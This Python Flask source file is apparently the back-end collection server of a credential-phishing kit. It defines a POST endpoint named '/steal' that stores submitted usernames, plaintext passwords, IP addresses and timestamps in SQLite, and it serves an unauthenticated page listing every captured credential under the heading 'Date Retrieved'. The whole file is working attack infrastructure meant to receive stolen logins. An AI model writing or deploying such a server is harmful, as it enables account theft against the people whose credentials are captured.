from flask import Flask, render_template, request, redirect, url_for
import sqlite3
import os

app = Flask(__name__)
DB_PATH = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data.db')

html = '''<head>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
</head>
<body>
BODY
</body>'''

def get_db_connection():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def create_db():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute('''CREATE TABLE IF NOT EXISTS data (
        username TEXT NOT NULL, 
        password TEST NOT NULL, 
        ip TEXT NOT NULL, 
        timestamp TEXT
        );
    ''')
    conn.commit()
    conn.close()
    
def insert_data(username, password, ip, timestamp):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("INSERT INTO data(username, password, ip, timestamp) VALUES(?, ?, ?, ?)", (username, password, ip, timestamp))
    conn.commit()
    conn.close()
    
def get_data():
    conn = get_db_connection()
    cur = conn.cursor()
    data = cur.execute("SELECT * FROM data").fetchall()
    conn.close()
    return data

@app.route("/")
def home():
    data = get_data()
    table = '''
    <table border="1">
        <thead>
            <tr>
            <th>Username</th>
            <th>Password</th>
            <th>IP</th>
            <th>Date Retrieved</th>
            </tr>
        </thead>
        <tbody>
            TBODY
        </tbody>
    </table>
    '''
    table_row = '''
    <tr>
    <td>USERNAME</td>
    <td>PASSWORD</td>
    <td>IP</td>
    <td>DATE</td>
    </tr>'''
    table_body = ""
    for target in data:
        username, password, ip, timestamp = target['username'], target['password'], target['ip'], target['timestamp']
        row = table_row.replace("USERNAME", username).replace("PASSWORD", password).replace("IP", ip).replace("DATE", timestamp)
        table_body += row
    table = table.replace("TBODY", table_body)
    html_page = html.replace("BODY", table)
    return html_page

@app.route('/steal', methods=['POST'])
def steal():
    username = request.form.get('username')
    password = request.form.get('password')
    ip = request.form.get('ip')
    timestamp = request.form.get('timestamp')
    insert_data(username, password, ip, timestamp)
    return ""

if __name__ == "__main__":
    create_db()
    app.run(host='0.0.0.0', debug=False)
